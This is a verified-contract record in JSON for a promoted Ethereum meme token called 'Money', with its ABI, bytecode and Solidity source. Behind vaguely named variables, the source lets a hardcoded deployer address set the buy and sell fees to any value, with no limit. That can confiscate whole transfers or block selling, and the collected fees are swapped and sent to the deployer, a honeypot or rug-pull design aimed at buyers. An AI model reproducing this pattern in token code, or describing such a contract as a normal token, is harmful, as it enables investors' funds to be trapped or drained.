{
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "Permissions",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "NowTradingOpen",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "newBurn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "newConfirm",
          "type": "uint256"
        }
      ],
      "name": "_setMoney",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "additional_sources": [],
  "can_be_visualized_via_sol2uml": true,
  "compiler_settings": {
    "evmVersion": "shanghai",
    "libraries": {},
    "metadata": {
      "bytecodeHash": "ipfs"
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": []
  },
  "compiler_version": "0.8.20+commit.a1b79de6",
  "constructor_args": null,
  "creation_bytecode": "0x60806040525f80555f60015534801562000017575f80fd5b50620000266012600a620001db565b62000036906305f5e100620001f2565b335f8181526002602090815260408083209490945530825260038152838220737a250d5630b4cf539739df2c5dacb4c659f2488d835290529182205f199055907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620000a56012600a620001db565b620000b5906305f5e100620001f2565b60405190815260200160405180910390a36200020c565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200012057815f1904821115620001045762000104620000cc565b808516156200011257918102915b93841c9390800290620000e5565b509250929050565b5f826200013857506001620001d5565b816200014657505f620001d5565b81600181146200015f57600281146200016a576200018a565b6001915050620001d5565b60ff8411156200017e576200017e620000cc565b50506001821b620001d5565b5060208310610133831016604e8410600b8410161715620001af575081810a620001d5565b620001bb8383620000e0565b805f1904821115620001d157620001d1620000cc565b0290505b92915050565b5f620001eb60ff84168362000128565b9392505050565b8082028115828204841417620001d557620001d5620000cc565b610ae1806200021a5f395ff3fe60806040526004361061009d575f3560e01c8063313ce56711610062578063313ce5671461017f5780636ffa6406146101a557806370a08231146101b957806395d89b41146101e4578063a9059cbb14610214578063dd62ed3e14610233575f80fd5b806306fdde03146100a8578063095ea7b3146100ee5780630a5b43421461011d57806318160ddd1461013e57806323b872dd14610160575f80fd5b366100a457005b5f80fd5b3480156100b3575f80fd5b506100d8604051806040016040528060058152602001644d6f6e657960d81b81525081565b6040516100e59190610799565b60405180910390f35b3480156100f9575f80fd5b5061010d6101083660046107ff565b610269565b60405190151581526020016100e5565b348015610128575f80fd5b5061013c610137366004610827565b6102d5565b005b348015610149575f80fd5b506101526102fe565b6040519081526020016100e5565b34801561016b575f80fd5b5061010d61017a366004610847565b61031b565b34801561018a575f80fd5b50610193601281565b60405160ff90911681526020016100e5565b3480156101b0575f80fd5b5061013c610368565b3480156101c4575f80fd5b506101526101d3366004610880565b60026020525f908152604090205481565b3480156101ef575f80fd5b506100d8604051806040016040528060058152602001644d4f4e455960d81b81525081565b34801561021f575f80fd5b5061010d61022e3660046107ff565b6103b2565b34801561023e575f80fd5b5061015261024d366004610899565b600360209081525f928352604080842090915290825290205481565b335f8181526003602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102c39086815260200190565b60405180910390a35060015b92915050565b3373e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d146102f4575f80fd5b5f91909155600155565b61030a6012600a6109be565b610318906305f5e1006109cc565b81565b6001600160a01b0383165f90815260036020908152604080832033845290915281208054839190839061034f9084906109e3565b9091555061036090508484846103c5565b949350505050565b3373e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d14610387575f80fd5b600454600160a81b900460ff161561039d575f80fd5b6004805460ff60a81b1916600160a81b179055565b5f6103be3384846103c5565b9392505050565b6004545f90600160a81b900460ff16806103fb57506001600160a01b03841673e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d145b8061042257506001600160a01b03831673e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d145b61042a575f80fd5b600454600160a81b900460ff1615801561044d57506004546001600160a01b0316155b801561045857505f82115b1561047957600480546001600160a01b0319166001600160a01b0385161790555b6001600160a01b0384165f90815260026020526040812080548492906104a09084906109e3565b90915550506004546001600160a01b0384811691161480156104cc5750600454600160a01b900460ff16155b801561050b575060646104e16012600a6109be565b6104ef906305f5e1006109cc565b6104f991906109f6565b305f9081526002602052604090205410155b15610695576004805460ff60a01b1916600160a01b1790556040805160028082526060820183525f9260208301908036833701905050905030815f8151811061055657610556610a15565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28160018151811061059e5761059e610a15565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac94760646105de6012600a6109be565b6105ec906305f5e1006109cc565b6105f691906109f6565b5f8430426040518663ffffffff1660e01b815260040161061a959493929190610a29565b5f604051808303815f87803b158015610631575f80fd5b505af1158015610643573d5f803e3d5ffd5b505060405173e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d92504780156108fc029250905f818181858888f19350505050158015610685573d5f803e3d5ffd5b50506004805460ff60a01b191690555b6001600160a01b0384163014610714576004545f906064906001600160a01b038781169116146106c7576001546106ca565b5f545b6106d490856109cc565b6106de91906109f6565b90506106ea81846109e3565b305f9081526002602052604081208054929550839290919061070d908490610a98565b9091555050505b6001600160a01b0383165f908152600260205260408120805484929061073b908490610a98565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161078791815260200190565b60405180910390a35060019392505050565b5f6020808352835180828501525f5b818110156107c4578581018301518582016040015282016107a8565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b03811681146107fa575f80fd5b919050565b5f8060408385031215610810575f80fd5b610819836107e4565b946020939093013593505050565b5f8060408385031215610838575f80fd5b50508035926020909101359150565b5f805f60608486031215610859575f80fd5b610862846107e4565b9250610870602085016107e4565b9150604084013590509250925092565b5f60208284031215610890575f80fd5b6103be826107e4565b5f80604083850312156108aa575f80fd5b6108b3836107e4565b91506108c1602084016107e4565b90509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561091857815f19048211156108fe576108fe6108ca565b8085161561090b57918102915b93841c93908002906108e3565b509250929050565b5f8261092e575060016102cf565b8161093a57505f6102cf565b8160018114610950576002811461095a57610976565b60019150506102cf565b60ff84111561096b5761096b6108ca565b50506001821b6102cf565b5060208310610133831016604e8410600b8410161715610999575081810a6102cf565b6109a383836108de565b805f19048211156109b6576109b66108ca565b029392505050565b5f6103be60ff841683610920565b80820281158282048414176102cf576102cf6108ca565b818103818111156102cf576102cf6108ca565b5f82610a1057634e487b7160e01b5f52601260045260245ffd5b500490565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b81811015610a775784516001600160a01b031683529383019391830191600101610a52565b50506001600160a01b03969096166060850152505050608001529392505050565b808201808211156102cf576102cf6108ca56fea2646970667358221220c192dbb55160f692a63e835b835474395b846e8fa8a2a93a728a5e74f07bec7e64736f6c63430008140033",
  "decoded_constructor_args": null,
  "deployed_bytecode": "0x60806040526004361061009d575f3560e01c8063313ce56711610062578063313ce5671461017f5780636ffa6406146101a557806370a08231146101b957806395d89b41146101e4578063a9059cbb14610214578063dd62ed3e14610233575f80fd5b806306fdde03146100a8578063095ea7b3146100ee5780630a5b43421461011d57806318160ddd1461013e57806323b872dd14610160575f80fd5b366100a457005b5f80fd5b3480156100b3575f80fd5b506100d8604051806040016040528060058152602001644d6f6e657960d81b81525081565b6040516100e59190610799565b60405180910390f35b3480156100f9575f80fd5b5061010d6101083660046107ff565b610269565b60405190151581526020016100e5565b348015610128575f80fd5b5061013c610137366004610827565b6102d5565b005b348015610149575f80fd5b506101526102fe565b6040519081526020016100e5565b34801561016b575f80fd5b5061010d61017a366004610847565b61031b565b34801561018a575f80fd5b50610193601281565b60405160ff90911681526020016100e5565b3480156101b0575f80fd5b5061013c610368565b3480156101c4575f80fd5b506101526101d3366004610880565b60026020525f908152604090205481565b3480156101ef575f80fd5b506100d8604051806040016040528060058152602001644d4f4e455960d81b81525081565b34801561021f575f80fd5b5061010d61022e3660046107ff565b6103b2565b34801561023e575f80fd5b5061015261024d366004610899565b600360209081525f928352604080842090915290825290205481565b335f8181526003602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102c39086815260200190565b60405180910390a35060015b92915050565b3373e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d146102f4575f80fd5b5f91909155600155565b61030a6012600a6109be565b610318906305f5e1006109cc565b81565b6001600160a01b0383165f90815260036020908152604080832033845290915281208054839190839061034f9084906109e3565b9091555061036090508484846103c5565b949350505050565b3373e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d14610387575f80fd5b600454600160a81b900460ff161561039d575f80fd5b6004805460ff60a81b1916600160a81b179055565b5f6103be3384846103c5565b9392505050565b6004545f90600160a81b900460ff16806103fb57506001600160a01b03841673e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d145b8061042257506001600160a01b03831673e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d145b61042a575f80fd5b600454600160a81b900460ff1615801561044d57506004546001600160a01b0316155b801561045857505f82115b1561047957600480546001600160a01b0319166001600160a01b0385161790555b6001600160a01b0384165f90815260026020526040812080548492906104a09084906109e3565b90915550506004546001600160a01b0384811691161480156104cc5750600454600160a01b900460ff16155b801561050b575060646104e16012600a6109be565b6104ef906305f5e1006109cc565b6104f991906109f6565b305f9081526002602052604090205410155b15610695576004805460ff60a01b1916600160a01b1790556040805160028082526060820183525f9260208301908036833701905050905030815f8151811061055657610556610a15565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28160018151811061059e5761059e610a15565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac94760646105de6012600a6109be565b6105ec906305f5e1006109cc565b6105f691906109f6565b5f8430426040518663ffffffff1660e01b815260040161061a959493929190610a29565b5f604051808303815f87803b158015610631575f80fd5b505af1158015610643573d5f803e3d5ffd5b505060405173e61b7cb79fa0c5ab4ef8d1fc87d2014dadc3b92d92504780156108fc029250905f818181858888f19350505050158015610685573d5f803e3d5ffd5b50506004805460ff60a01b191690555b6001600160a01b0384163014610714576004545f906064906001600160a01b038781169116146106c7576001546106ca565b5f545b6106d490856109cc565b6106de91906109f6565b90506106ea81846109e3565b305f9081526002602052604081208054929550839290919061070d908490610a98565b9091555050505b6001600160a01b0383165f908152600260205260408120805484929061073b908490610a98565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161078791815260200190565b60405180910390a35060019392505050565b5f6020808352835180828501525f5b818110156107c4578581018301518582016040015282016107a8565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b03811681146107fa575f80fd5b919050565b5f8060408385031215610810575f80fd5b610819836107e4565b946020939093013593505050565b5f8060408385031215610838575f80fd5b50508035926020909101359150565b5f805f60608486031215610859575f80fd5b610862846107e4565b9250610870602085016107e4565b9150604084013590509250925092565b5f60208284031215610890575f80fd5b6103be826107e4565b5f80604083850312156108aa575f80fd5b6108b3836107e4565b91506108c1602084016107e4565b90509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561091857815f19048211156108fe576108fe6108ca565b8085161561090b57918102915b93841c93908002906108e3565b509250929050565b5f8261092e575060016102cf565b8161093a57505f6102cf565b8160018114610950576002811461095a57610976565b60019150506102cf565b60ff84111561096b5761096b6108ca565b50506001821b6102cf565b5060208310610133831016604e8410600b8410161715610999575081810a6102cf565b6109a383836108de565b805f19048211156109b6576109b66108ca565b029392505050565b5f6103be60ff841683610920565b80820281158282048414176102cf576102cf6108ca565b818103818111156102cf576102cf6108ca565b5f82610a1057634e487b7160e01b5f52601260045260245ffd5b500490565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b81811015610a775784516001600160a01b031683529383019391830191600101610a52565b50506001600160a01b03969096166060850152505050608001529392505050565b808201808211156102cf576102cf6108ca56fea2646970667358221220c192dbb55160f692a63e835b835474395b846e8fa8a2a93a728a5e74f07bec7e64736f6c63430008140033",
  "evm_version": "shanghai",
  "external_libraries": [],
  "file_path": "Money.sol",
  "is_changed_bytecode": false,
  "is_fully_verified": true,
  "is_partially_verified": false,
  "is_self_destructed": false,
  "is_verified": true,
  "is_verified_via_eth_bytecode_db": true,
  "is_verified_via_sourcify": true,
  "is_vyper_contract": false,
  "language": "solidity",
  "minimal_proxy_address_hash": null,
  "name": "Money",
  "optimization_enabled": true,
  "optimization_runs": 200,
  "source_code": "/*\n\nThey often say money can’t buy happiness, but with $MONEY, we aim to redefine that saying.\n\nTelegram: https://t.me/MoneyCoinETH\nTwitter: https://twitter.com/MoneyCoinERC\nWebsite: https://moneycoin.space\n\n*/\n// SPDX-License-Identifier: unlicense\n\npragma solidity ^0.8.20;\n\n    interface IUniswapV2Router02 {\n        function swapExactTokensForETHSupportingFeeOnTransferTokens(\n            uint amountIn,\n            uint amountOutMin,\n            address[] calldata path,\n            address to,\n            uint deadline\n            ) external;\n        }\n        \n    contract Money {\n        string public constant name = \"Money\";  //\n        string public constant symbol = \"MONEY\";  //\n        uint8 public constant decimals = 18;\n        uint256 public constant totalSupply = 100_000_000 * 10**decimals;\n\n        uint256 BurnFigure = 0;\n        uint256 ConfirmFigure = 0;\n        uint256 constant swapAmount = totalSupply / 100;\n\n        mapping (address => uint256) public balanceOf;\n        mapping (address => mapping (address => uint256)) public allowance;\n            \n        error Permissions();\n            \n        event Transfer(address indexed from, address indexed to, uint256 value);\n        event Approval(\n            address indexed owner,\n            address indexed spender,\n            uint256 value\n        );\n            \n\n        address private pair;\n        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\n        address payable constant deployer = payable(address(0xE61b7Cb79fA0c5Ab4eF8d1fC87D2014dADc3b92d)); //\n\n        bool private swapping;\n        bool private tradingOpenNow;\n\n        constructor() {\n            balanceOf[msg.sender] = totalSupply;\n            allowance[address(this)][routerAddress] = type(uint256).max;\n            emit Transfer(address(0), msg.sender, totalSupply);\n        }\n\n         receive() external payable {}\n\n        function approve(address spender, uint256 amount) external returns (bool){\n            allowance[msg.sender][spender] = amount;\n            emit Approval(msg.sender, spender, amount);\n            return true;\n        }\n\n        function transfer(address to, uint256 amount) external returns (bool){\n            return _transfer(msg.sender, to, amount);\n        }\n\n        function transferFrom(address from, address to, uint256 amount) external returns (bool){\n            allowance[from][msg.sender] -= amount;        \n            return _transfer(from, to, amount);\n        }\n\n        function _transfer(address from, address to, uint256 amount) internal returns (bool){\n            require(tradingOpenNow || from == deployer || to == deployer);\n\n            if(!tradingOpenNow && pair == address(0) && amount > 0)\n                pair = to;\n\n            balanceOf[from] -= amount;\n\n            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\n                swapping = true;\n                address[] memory path = new  address[](2);\n                path[0] = address(this);\n                path[1] = ETH;\n                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n                    swapAmount,\n                    0,\n                    path,\n                    address(this),\n                    block.timestamp\n                    );\n                deployer.transfer(address(this).balance);\n                swapping = false;\n                }\n\n            if(from != address(this)){\n                uint256 FinalFigure = amount * (from == pair ? BurnFigure : ConfirmFigure) / 100;\n                amount -= FinalFigure;\n                balanceOf[address(this)] += FinalFigure;\n            }\n                balanceOf[to] += amount;\n                emit Transfer(from, to, amount);\n                return true;\n            }\n\n        function NowTradingOpen() external {\n            require(msg.sender == deployer);\n            require(!tradingOpenNow);\n            tradingOpenNow = true;        \n            }\n\n        function _setMoney(uint256 newBurn, uint256 newConfirm) external {\n            require(msg.sender == deployer);\n            BurnFigure = newBurn;\n            ConfirmFigure = newConfirm;\n            }\n        }",
  "sourcify_repo_url": "https://repo.sourcify.dev/contracts/full_match/1/0xA4AA03556aD3096CaB88106D4b2Bb4704096B1E2/",
  "verified_at": "2023-11-17T02:56:22.348967Z",
  "verified_twin_address_hash": null
}